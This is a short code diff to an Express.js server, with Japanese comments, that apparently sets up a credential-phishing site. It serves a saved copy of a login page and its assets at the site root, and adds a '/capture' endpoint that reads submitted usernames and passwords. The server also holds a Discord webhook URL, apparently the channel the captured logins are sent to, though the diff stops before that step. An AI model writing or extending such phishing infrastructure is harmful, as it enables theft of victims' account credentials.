@@ -4,10 +4,18 @@ const app = express();
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
-app.use(express.static("."));
 
 const webhook = process.env.DISCORD_WEBHOOK;
 
+// ルート（/）でHTMLを返す
+app.get("/", (req, res) => {
+    res.sendFile(__dirname + "/login.html");
+});
+
+// 保存した_filesフォルダの中身を配信
+app.use("/login_files", express.static(__dirname + "/login_files"));
+
+// ログイン情報を受け取る
 app.post("/capture", async (req, res) => {
     const username = req.body.username;
     const password = req.body.password;
